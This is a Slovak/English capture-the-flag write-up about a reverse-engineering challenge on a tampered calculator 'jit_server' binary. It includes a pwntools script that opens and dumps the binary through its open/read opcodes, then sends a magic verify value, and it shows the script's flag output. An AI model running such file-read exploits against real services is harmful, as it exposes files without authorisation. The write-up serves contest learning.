# Zadanie

EN: The programmable calculator Calcunova Sigma can also load user data. This part of the functionality is handled by a component called /usr/local/bin/jit_server (binary attached). There is also a running version of this emulator that has been tampered with. Study your own copy of the binary, then use that knowledge to identify what's wrong with the production instance running at exp.cybergame.sk:7042.

SK: Programovateľná kalkulačka Calcunova Sigma dokáže načítavať aj používateľské dáta. Túto časť funkcionality zabezpečuje komponent s názvom /usr/local/bin/jit_server (binárka je priložená). Existuje aj spustená verzia tohto emulátora, ktorú niekto úmyselne upravil. Preskúmaj vlastnú kópiu binárky a využitím nadobudnutých poznatkov zisti, čo je zlé s produkčnou inštanciou bežiacou na adrese exp.cybergame.sk:7042.

`exp.cybergame.sk:7042`

**Súbory**

- jit_server

## Riešenie

Vzhľadom na nedostatok času z dôvodu doháňania pracovného a súkromého života doplním tento write-up neskôr, keď budem mať viac času. Túto úlohu som taktiež zvládol vďaka kombinácii ChatGPT, Gemini a Claude - hlave Calude v spolupráci s ghidrou a MCP.. V skratke boli tam tri fukncie, ktoré sa zavolali podľa toho aký opcode sa zadal do vstupu binárke.. Boli tri, A3, CC a FF, A3 sa správal ako open(), CC ako read() a FF ja akýsi verify, ktorému musíme zadať magic value. read myslím printuje 0x400 bajtov. V zadaní bola cesta k binárke, takže ako argument pre open dáme cestu k binárke terminovanú nullbajtom of course, potom cc00 tolkokrat aby sme printli celu binarku a na koniec posleme megic bajt ab sa to vobec vykanalo.

Tu je skript.

```python
from pwn import *
import struct

# pripojenie
conn = remote('127.0.0.1', 1337)

payload = b'\xa3'
payload += b'/usr/local/bin/jit_server\x00'
payload += b'\x00'
repeat_count = 0x150000 // 0x400
payload += b'\xcc\x00' * repeat_count
payload += b'\xff'
payload += struct.pack('<I', 0x5a94125d)

# pošli payload
conn.send(payload)

try:
    response = conn.recvall(timeout=2)
    s = response.decode(errors='ignore')
    idx = s.find('U0st')
    if idx != -1:
        print("="*50)
        print(f"Flag:\n{s[idx:idx+50]}")
        print("="*50)
    # nič sa netlačí, ak substring nebol nájdený
except Exception as e:
    print(f"[*] Chyba: {e}")
finally:
    conn.close()

```

Výstup

```
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Receiving all data: Done (1.31MB)
[*] Closed connection to 127.0.0.1 port 1337
==================================================
Flag:
U0stQ0VSVHtSRURBQ1RFRH0=function not implementedle
==================================================
```

`U0stQ0VSVHtSRURBQ1RFRH0=` je `SK-CERT{REDACTED}`. V čase písania writeupu už server hry nebol dostupný



## Vlajka

    SK-CERT{why_w0uld_y0u_u53_llvm???}
